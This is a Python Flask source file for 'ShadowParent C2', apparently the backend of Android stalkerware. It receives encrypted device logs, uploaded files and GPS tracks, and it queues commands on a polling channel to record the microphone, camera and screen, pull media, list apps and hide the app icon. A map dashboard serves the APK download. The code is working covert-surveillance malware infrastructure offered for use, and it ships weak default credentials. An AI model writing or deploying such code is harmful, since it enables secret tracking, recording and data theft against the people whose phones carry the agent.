"""
ShadowParent C2 — Flask dashboard + ingest API

Endpoints
  POST /ingest            encrypted device log      (form: d, k)
  POST /upload            file upload               (multipart: meta, f + X-Key)
  GET  /api/devices       list devices
  GET  /api/logs          recent logs
  GET  /api/location      latest location
  GET  /api/track/<id>    location history
  GET  /dashboard          web UI
  GET  /health            liveness probe
"""
import os
import json
import time
import uuid
import hmac

from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, abort
from werkzeug.security import check_password_hash

import models
import crypto

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "sp-" + uuid.uuid4().hex)
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "admin123")
API_KEY = os.environ.get("API_KEY", "")
UPLOAD_DIR = os.environ.get("UPLOAD_DIR", "/tmp/sp_uploads")
FILE_TOKEN = os.environ.get("FILE_TOKEN", "")
APK_URL = os.environ.get(
    "APK_URL",
    "https://github.com/palcinkoo/shadowparent-dashboard/releases/download/v1.1.1/android_UI.apk",
)

os.makedirs(UPLOAD_DIR, exist_ok=True)
models.init_db()


def authed():
    return session.get("logged_in", False)


@app.before_request
def guard():
    if request.path in ("/health", "/login"):
        return
    if request.path.startswith("/ingest") or request.path.startswith("/upload"):
        return
    if request.path.startswith("/apk") or request.path.startswith("/poll"):
        return
    if request.path.startswith("/beacon"):
        return
    if not authed():
        if request.path.startswith("/api/"):
            return jsonify({"error": "unauthorized"}), 401
        return redirect(url_for("login"))


@app.route("/apk/android_UI.apk")
def apk_download():
    """Stable, direct download URL for the container APK (used by the
    Android Enterprise provisioning QR - the device must be able to fetch
    the package without a redirect)."""
    import urllib.request

    try:
        req = urllib.request.Request(APK_URL, headers={"User-Agent": "ShadowParent"})
        with urllib.request.urlopen(req, timeout=60) as remote:
            data = remote.read()
    except Exception as exc:  # noqa: BLE001
        return jsonify({"error": "apk fetch failed", "detail": str(exc)}), 502

    resp = app.response_class(data, mimetype="application/vnd.android.package-archive")
    resp.headers["Content-Disposition"] = 'attachment; filename="android_UI.apk"'
    resp.headers["Content-Length"] = str(len(data))
    resp.headers["Cache-Control"] = "public, max-age=300"
    return resp


@app.route("/health")
def health():
    return jsonify({"ok": True, "ts": int(time.time() * 1000)})


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        if hmac.compare_digest(u, ADMIN_USER) and hmac.compare_digest(p, ADMIN_PASS):
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template_string(LOGIN_HTML, error="Neplatné prihlásenie"), 401
    return render_template_string(LOGIN_HTML, error=None)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


def _key_ok(supplied: str) -> bool:
    if not API_KEY:
        return True
    return hmac.compare_digest(supplied or "", API_KEY)


@app.route("/ingest", methods=["POST"])
def ingest():
    blob = request.form.get("d", "")
    key = request.form.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    if not blob:
        return jsonify({"error": "missing d"}), 400
    try:
        device_id, kind, payload = crypto.decrypt(blob)
    except Exception as exc:
        return jsonify({"error": "decrypt failed", "detail": str(exc)}), 400

    models.touch_device(device_id)

    # Batched payloads look like {"items": [...]} - every item is stored on its
    # own row so the dashboard stays readable.
    items = None
    try:
        parsed = json.loads(payload)
        if isinstance(parsed, dict) and isinstance(parsed.get("items"), list):
            items = parsed["items"]
    except Exception:
        pass

    if items is not None:
        for item in items:
            text = item if isinstance(item, str) else json.dumps(item)
            _store(device_id, kind, text)
    else:
        _store(device_id, kind, payload)

    return jsonify({"ok": True, "count": len(items) if items is not None else 1}), 200


def _store(device_id: str, kind: str, payload: str):
    if kind == "location":
        try:
            data = json.loads(payload)
            models.insert_location(
                device_id,
                float(data.get("lat")),
                float(data.get("lon")),
                data.get("acc"),
                data.get("provider"),
                data.get("source", "gps"),
            )
            return
        except Exception:
            pass
    models.insert_log(device_id, kind, payload)


@app.route("/upload", methods=["POST"])
def upload():
    key = request.headers.get("X-Key", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    meta = request.form.get("meta", "")
    f = request.files.get("f")
    if f is None:
        return jsonify({"error": "missing file"}), 400

    device_id = meta.split("|")[0] if meta else "unknown"
    kind = meta.split("|")[1] if meta and len(meta.split("|")) > 1 else "file"

    safe = os.path.basename(f.filename or "upload.bin")
    dest = os.path.join(UPLOAD_DIR, f"{int(time.time())}_{device_id}_{safe}")
    f.save(dest)

    models.touch_device(device_id)
    models.insert_file(device_id, kind, safe, os.path.getsize(dest), dest)
    return jsonify({"ok": True, "path": dest}), 200


@app.route("/beacon", methods=["POST"])
def beacon():
    """Plaintext status beacon from the agent.

    The regular channel is encrypted and batched, so a device that dies during
    startup would leave no trace. The beacon is a small plain POST that
    proves the app is alive and carries the crash report.
    """
    key = request.form.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    payload = request.form.get("d", "")
    kind = request.form.get("kind", "beacon")
    if not payload:
        return jsonify({"error": "missing d"}), 400
    device_id = "unknown"
    try:
        parsed = json.loads(payload)
        if isinstance(parsed, dict):
            device_id = str(parsed.get("device_id") or "unknown")
    except Exception:
        pass
    models.touch_device(device_id)
    models.insert_log(device_id, f"beacon:{kind}", payload[:4000])
    return jsonify({"ok": True}), 200


@app.route("/poll")
def poll():
    """Command channel for the device. The agent polls this endpoint and
    executes the queued commands."""
    device_id = request.args.get("device_id", "")
    key = request.args.get("k", "")
    if not _key_ok(key):
        return jsonify({"error": "bad key"}), 403
    if not device_id:
        return jsonify({"error": "missing device_id"}), 400
    models.touch_device(device_id)
    return jsonify(models.fetch_commands(device_id))


@app.route("/api/command", methods=["POST"])
def api_command():
    """Queues a command for a device (dashboard -> agent)."""
    data = request.get_json(silent=True) or request.form
    device_id = (data.get("device_id") or "").strip()
    cmd = (data.get("cmd") or "").strip()
    args = data.get("args") or {}
    if not device_id or not cmd:
        return jsonify({"error": "device_id and cmd are required"}), 400
    models.insert_command(device_id, cmd, json.dumps(args))
    return jsonify({"ok": True})


@app.route("/api/devices")
def api_devices():
    return jsonify(models.list_devices())


@app.route("/api/logs")
def api_logs():
    return jsonify(models.recent_logs(
        device_id=request.args.get("device_id"),
        kind=request.args.get("kind"),
        limit=int(request.args.get("limit", 200)),
    ))


@app.route("/api/location")
def api_location():
    return jsonify(models.latest_location(request.args.get("device_id")) or {})


@app.route("/api/track/<device_id>")
def api_track(device_id):
    return jsonify(models.location_track(device_id))


@app.route("/api/files")
def api_files():
    return jsonify(models.list_files(request.args.get("device_id")))


@app.route("/dashboard")
def dashboard():
    return render_template_string(DASH_HTML)


LOGIN_HTML = """<!DOCTYPE html>
<html lang="sk"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShadowParent — login</title>
<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#0d1117;color:#c9d1d9;display:flex;align-items:center;justify-content:center;height:100vh}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px;width:320px}
h1{font-size:18px;margin:0 0 20px;color:#e6edf3}
label{display:block;font-size:12px;margin:12px 0 4px;color:#8b949e}
input{width:100%;box-sizing:border-box;background:#0d1117;border:1px solid #30363d;
border-radius:6px;padding:9px 12px;color:#c9d1d9;font-size:14px}
button{margin-top:20px;width:100%;background:#238636;border:none;color:#fff;padding:10px;
border-radius:6px;font-weight:600;cursor:pointer;font-size:14px}
.err{color:#f85149;font-size:13px;margin-top:12px}
</style></head><body>
<div class="card">
<h1>ShadowParent C2</h1>
<form method="post">
<label>Username</label><input name="username" autofocus>
<label>Password</label><input name="password" type="password">
<button type="submit">Prihlásiť</button>
</form>
{% if error %}<div class="err">{{ error }}</div>{% endif %}
</div></body></html>"""


DASH_HTML = """<!DOCTYPE html>
<html lang="sk"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShadowParent — dashboard</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#0d1117;color:#c9d1d9}
header{display:flex;align-items:center;gap:16px;padding:12px 20px;
background:#161b22;border-bottom:1px solid #30363d;position:sticky;top:0;z-index:1000}
h1{font-size:16px;color:#e6edf3;font-weight:600}
.wrap{display:grid;grid-template-columns:300px 1fr;gap:0;height:calc(100vh - 53px)}
.side{background:#161b22;border-right:1px solid #30363d;overflow-y:auto;padding:12px}
.main{overflow-y:auto;padding:16px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;margin-bottom:14px}
.card h2{font-size:13px;text-transform:uppercase;color:#8b949e;margin-bottom:10px;letter-spacing:.5px}
.dev{padding:9px;border-radius:6px;cursor:pointer;border:1px solid transparent;margin-bottom:4px}
.dev:hover{background:#0d1117}
.dev.sel{border-color:#238636;background:#0d1117}
.dev .id{font-size:12px;font-family:ui-monospace,monospace;color:#58a6ff}
.dev .meta{font-size:11px;color:#6e7681;margin-top:2px}
#map{height:340px;border-radius:8px;z-index:1}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;color:#8b949e;font-weight:500;padding:5px 6px;border-bottom:1px solid #30363d}
td{padding:5px 6px;border-bottom:1px solid #21262d;vertical-align:top}
.k{color:#58a6ff;font-family:ui-monospace,monospace}
.p{color:#8b949e;font-family:ui-monospace,monospace;font-size:11px;word-break:break-all}
a{color:#58a6ff}
.btn{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:5px 11px;
border-radius:6px;cursor:pointer;font-size:12px;text-decoration:none}
@media(max-width:760px){.wrap{grid-template-columns:1fr;height:auto}.side{max-height:220px}}
</style></head><body>
<header>
<h1>ShadowParent C2</h1>
<span style="flex:1"></span>
<button class="btn" onclick="refresh()">Refresh</button>
<a class="btn" href="/logout">Logout</a>
</header>
<div class="wrap">
<div class="side">
<div class="card"><h2>Zariadenia</h2><div id="devices"></div></div>
<div class="card"><h2>Súbory</h2><div id="files" style="font-size:12px"></div></div>
</div>
<div class="main">
<div class="card"><h2>Mapa polôh</h2><div id="map"></div></div>
<div class="card"><h2>Príkazy</h2>
<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">
<select id="cmd" style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;
border-radius:6px;padding:6px;font-size:12px">
<option value="ping">ping</option><option value="loc">loc</option>
<option value="mic">mic</option><option value="media">media</option>
<option value="screen">screen</option><option value="cam">cam</option>
<option value="usage">usage</option><option value="apps">apps</option>
<option value="ddr">ddr</option><option value="flush">flush</option>
<option value="hide">hide (skryje ikonu)</option><option value="show">show (zobrazí ikonu)</option>
<option value="cfg">cfg</option>
</select>
<input id="args" placeholder="args (JSON, voliteľné)" style="flex:1;min-width:160px;
background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;padding:6px;font-size:12px">
<button class="btn" onclick="sendCmd()">Poslať</button>
<span id="cmdr" style="font-size:12px;color:#6e7681"></span>
</div></div>
<div class="card"><h2>Logy</h2><table>
<thead><tr><th style="width:70px">Čas</th><th style="width:70px">Typ</th><th>Obsah</th></tr></thead>
<tbody id="logs"></tbody></table></div>
</div>
</div>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
let sel = null, map = null, markers = {};
function fmt(ts){ if(!ts) return ''; const d=new Date(ts);
  return d.toLocaleString('sv-SE',{month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
function esc(s){ return (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
async function j(u){ const r=await fetch(u); if(!r.ok) return null; return r.json(); }
async function refresh(){
  const devs = await j('/api/devices') || [];
  document.getElementById('devices').innerHTML = devs.length ? devs.map(d=>
    `<div class="dev ${sel===d.device_id?'sel':''}" onclick="pick('${d.device_id}')">
      <div class="id">${esc(d.device_id)}</div>
      <div class="meta">${esc(d.model||'')} · ${fmt(d.last_seen)}</div></div>`).join('')
    : '<div style="font-size:12px;color:#6e7681">Žiadne zariadenia</div>';
  const logs = await j('/api/logs?limit=150' + (sel?'&device_id='+encodeURIComponent(sel):'')) || [];
  document.getElementById('logs').innerHTML = logs.map(l=>
    `<tr><td style="color:#6e7681">${fmt(l.ts)}</td><td class="k">${esc(l.kind)}</td>
     <td class="p">${esc(l.payload)}</td></tr>`).join('');
  const files = await j('/api/files') || [];
  document.getElementById('files').innerHTML = files.length ? files.map(f=>
    `<div style="padding:4px 0;border-bottom:1px solid #21262d">
      <span class="k">${esc(f.kind)}</span> ${esc(f.filename)}
      <span style="color:#6e7681">${(f.size/1024).toFixed(1)} KB</span></div>`).join('')
    : '<span style="color:#6e7681">Žiadne súbory</span>';
  await drawMap();
}
async function drawMap(){
  if(!map){ map = L.map('map').setView([48.1486,17.1077],6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map); }
  Object.values(markers).forEach(m=>map.removeLayer(m)); markers={};
  const devs = await j('/api/devices') || [];
  for(const d of devs){
    const loc = await j('/api/location?device_id='+encodeURIComponent(d.device_id));
    if(loc && loc.lat){
      const mk = L.marker([loc.lat,loc.lon]).addTo(map).bindPopup(
        esc(d.device_id)+'<br>'+loc.lat+', '+loc.lon+'<br>'+fmt(loc.ts));
      markers[d.device_id]=mk;
    }
  }
}
function pick(id){ sel = id; refresh(); }
async function sendCmd(){
  const el = document.getElementById('cmdr');
  if(!sel){ el.textContent = 'Najprv vyber zariadenie'; el.style.color='#f85149'; return; }
  let args = {};
  const raw = document.getElementById('args').value.trim();
  if(raw){ try { args = JSON.parse(raw); } catch(e){ el.textContent = 'Neplatný JSON'; el.style.color='#f85149'; return; } }
  const r = await fetch('/api/command', {method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({device_id: sel, cmd: document.getElementById('cmd').value, args})});
  const d = await r.json();
  el.textContent = d.ok ? ('Odoslané: ' + d.cmd) : (d.error || 'Chyba');
  el.style.color = d.ok ? '#3fb950' : '#f85149';
}
setInterval(refresh, 15000);
refresh();
</script></body></html>"""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
